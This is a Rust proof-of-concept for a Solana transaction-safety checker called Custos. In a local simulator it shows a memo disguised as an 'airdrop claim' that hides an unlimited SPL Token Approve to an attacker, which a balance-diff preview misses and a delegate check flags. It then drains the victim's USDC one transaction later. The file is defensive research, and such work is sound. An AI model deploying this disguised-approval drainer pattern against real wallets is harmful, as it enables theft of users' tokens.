//! Custos incumbent-gap proof (answers the 2026-07-04 critique's #2).
//!
//! Claim: a transaction can leave the signer's token balances COMPLETELY
//! UNCHANGED during simulation, yet hand an attacker unlimited future control
//! of those tokens. A tool that judges safety by simulated balance-delta
//! returns GREEN. Custos's F2 invariant reads the post-simulation delegate
//! state and returns RED.
//!
//! This is the structural blind spot of "simulate + diff balances": an SPL
//! Token `Approve` (or `SetAuthority`) moves NO funds in this tx — it grants
//! a delegate the right to move them in a LATER tx. We prove the gap AND that
//! the grant is real by draining the account one tx later.

use std::path::PathBuf;
use std::str::FromStr;

use base64::Engine;
use litesvm::LiteSVM;
use solana_account::Account;
use solana_instruction::{AccountMeta, Instruction};
use solana_keypair::Keypair;
use solana_pubkey::Pubkey;
use solana_signer::Signer;
use solana_transaction::Transaction;

const USDC_MINT: &str = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
const TOKEN: &str = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
const MEMO: &str = "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr";

fn art() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("artifacts")
}

// --- SPL Token account (165 bytes) byte-poke + field readers ---
fn token_account_bytes(mint: &Pubkey, owner: &Pubkey, amount: u64) -> Vec<u8> {
    let mut d = vec![0u8; 165];
    d[0..32].copy_from_slice(mint.as_ref());
    d[32..64].copy_from_slice(owner.as_ref());
    d[64..72].copy_from_slice(&amount.to_le_bytes());
    // delegate COption tag @72..76 = 0 (None); state @108 = 1 (Initialized)
    d[108] = 1;
    d
}
fn read_amount(d: &[u8]) -> u64 {
    u64::from_le_bytes(d[64..72].try_into().unwrap())
}
fn read_delegate(d: &[u8]) -> Option<Pubkey> {
    if u32::from_le_bytes(d[72..76].try_into().unwrap()) == 1 {
        Some(Pubkey::try_from(&d[76..108]).unwrap())
    } else {
        None
    }
}
fn read_delegated_amount(d: &[u8]) -> u64 {
    u64::from_le_bytes(d[121..129].try_into().unwrap())
}

// --- SPL Token instructions (hand-rolled wire encoding) ---
fn approve_ix(token: Pubkey, source: Pubkey, delegate: Pubkey, owner: Pubkey, amount: u64) -> Instruction {
    let mut data = vec![4u8]; // TokenInstruction::Approve
    data.extend_from_slice(&amount.to_le_bytes());
    Instruction {
        program_id: token,
        accounts: vec![
            AccountMeta::new(source, false),
            AccountMeta::new_readonly(delegate, false),
            AccountMeta::new_readonly(owner, true),
        ],
        data,
    }
}
fn transfer_ix(token: Pubkey, source: Pubkey, dest: Pubkey, authority: Pubkey, amount: u64) -> Instruction {
    let mut data = vec![3u8]; // TokenInstruction::Transfer
    data.extend_from_slice(&amount.to_le_bytes());
    Instruction {
        program_id: token,
        accounts: vec![
            AccountMeta::new(source, false),
            AccountMeta::new(dest, false),
            AccountMeta::new_readonly(authority, true),
        ],
        data,
    }
}
fn memo_ix(signer: Pubkey, text: &str) -> Instruction {
    Instruction {
        program_id: Pubkey::from_str(MEMO).unwrap(),
        accounts: vec![AccountMeta::new_readonly(signer, true)],
        data: text.as_bytes().to_vec(),
    }
}

fn set_token_account(svm: &mut LiteSVM, token: Pubkey, pk: Pubkey, mint: &Pubkey, owner: &Pubkey, amount: u64) {
    svm.set_account(
        pk,
        Account {
            lamports: 2_039_280, // rent-exempt for 165 bytes
            data: token_account_bytes(mint, owner, amount),
            owner: token,
            executable: false,
            rent_epoch: u64::MAX,
        },
    )
    .unwrap();
}

fn main() {
    println!("=== Custos incumbent-gap proof: hidden delegate (F2) ===\n");
    let mut svm = LiteSVM::new();

    let token = Pubkey::from_str(TOKEN).unwrap();
    let usdc = Pubkey::from_str(USDC_MINT).unwrap();

    // real USDC mint + real SPL Token + Memo programs
    let mint_json: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(art().join("usdc_mint.json")).unwrap()).unwrap();
    let mdata = base64::engine::general_purpose::STANDARD
        .decode(mint_json["account"]["data"][0].as_str().unwrap())
        .unwrap();
    svm.set_account(
        usdc,
        Account { lamports: 1_000_000, data: mdata, owner: token, executable: false, rent_epoch: u64::MAX },
    )
    .unwrap();
    svm.add_program(token, &std::fs::read(art().join("spl_token.so")).unwrap()).unwrap();
    svm.add_program(Pubkey::from_str(MEMO).unwrap(), &std::fs::read(art().join("memo.so")).unwrap()).unwrap();

    // actors
    let user = Keypair::new();
    let attacker = Keypair::new();
    svm.airdrop(&user.pubkey(), 1_000_000_000).unwrap();
    svm.airdrop(&attacker.pubkey(), 1_000_000_000).unwrap();

    // user holds 1000 USDC; attacker holds 0
    let user_ata = Keypair::new().pubkey();
    let attacker_ata = Keypair::new().pubkey();
    let start: u64 = 1_000_000_000; // 1000 USDC (6 decimals)
    set_token_account(&mut svm, token, user_ata, &usdc, &user.pubkey(), start);
    set_token_account(&mut svm, token, attacker_ata, &usdc, &attacker.pubkey(), 0);

    let pre = svm.get_account(&user_ata).unwrap().data;
    println!("user USDC before : {} (delegate: {:?})", read_amount(&pre) as f64 / 1e6, read_delegate(&pre));

    // ---- THE MALICIOUS TX ----
    // Looks like an airdrop claim (memo). Hidden 2nd ix: Approve(u64::MAX) to
    // the attacker as delegate. NO USDC moves in this tx.
    let malicious = Transaction::new_signed_with_payer(
        &[
            memo_ix(user.pubkey(), "\u{1F381} Claim your ARDR airdrop"),
            approve_ix(token, user_ata, attacker.pubkey(), user.pubkey(), u64::MAX),
        ],
        Some(&user.pubkey()),
        &[&user],
        svm.latest_blockhash(),
    );
    svm.send_transaction(malicious).expect("malicious tx executes");

    let post = svm.get_account(&user_ata).unwrap().data;
    let bal_before = read_amount(&pre);
    let bal_after = read_amount(&post);
    let delegate = read_delegate(&post);
    let delegated = read_delegated_amount(&post);

    println!("user USDC after  : {} (delegate: {:?})\n", bal_after as f64 / 1e6, delegate);

    // ---- What a balance-diff simulator sees ----
    let usdc_delta = bal_after as i128 - bal_before as i128;
    println!("--- Simulator A: balance-diff preview (Blockaid/Blowfish-style net-change) ---");
    println!("  USDC net change : {}", usdc_delta);
    println!("  SOL net change  : -fee (gas only)");
    let sim_a_verdict = if usdc_delta < 0 { "RED" } else { "GREEN" };
    println!("  => VERDICT: {sim_a_verdict}  (\"no tokens leave your wallet — looks like a memo\")\n");

    // ---- What Custos F2 sees ----
    println!("--- Simulator B: Custos F2 (post-sim delegate/authority invariant) ---");
    let unlimited = delegated == u64::MAX;
    let f2_fires = delegate == Some(attacker.pubkey());
    println!("  post-state delegate    : {:?}", delegate);
    println!("  delegated amount       : {}{}", delegated, if unlimited { " (UNLIMITED = u64::MAX)" } else { "" });
    let f2_verdict = if f2_fires { "RED" } else { "GREEN" };
    println!("  => VERDICT: {f2_verdict}  (\"this tx grants an unknown address permission to move ALL your USDC\")\n");

    // ---- Prove the grant is real: attacker drains one tx later ----
    println!("--- One tx later: attacker (as delegate) drains the account ---");
    let drain = Transaction::new_signed_with_payer(
        &[transfer_ix(token, user_ata, attacker_ata, attacker.pubkey(), bal_after)],
        Some(&attacker.pubkey()),
        &[&attacker],
        svm.latest_blockhash(),
    );
    let drained = svm.send_transaction(drain).is_ok();
    let user_final = read_amount(&svm.get_account(&user_ata).unwrap().data);
    let atk_final = read_amount(&svm.get_account(&attacker_ata).unwrap().data);
    println!("  drain tx succeeded: {drained}");
    println!("  user USDC final    : {}", user_final as f64 / 1e6);
    println!("  attacker USDC final: {}\n", atk_final as f64 / 1e6);

    // ---- Result ----
    let gap_proven = sim_a_verdict == "GREEN" && f2_verdict == "RED" && drained && user_final == 0;
    println!(
        "=== INCUMBENT-GAP PROOF: {} ===",
        if gap_proven {
            "PROVEN — balance-diff said SAFE; Custos F2 said DANGER; funds gone one tx later"
        } else {
            "NOT PROVEN"
        }
    );
}
